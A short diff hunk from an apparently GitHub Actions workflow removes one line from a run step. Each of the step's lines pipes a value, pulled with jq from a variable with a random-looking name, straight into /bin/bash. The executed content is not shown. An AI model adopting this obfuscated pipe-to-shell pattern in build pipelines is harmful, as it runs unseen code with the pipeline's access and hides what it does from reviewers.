@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$hjsc2" | jq -r .cvry6934 | /bin/bash
           echo $u3 | jq -r .dr76 | /bin/bash
           echo $tyjaa1 | jq -r .pmfo09 | /bin/bash
-          echo $lxil91057 | jq -r .ck96121 | /bin/bash
 
       - name: Save archive
         if: always()
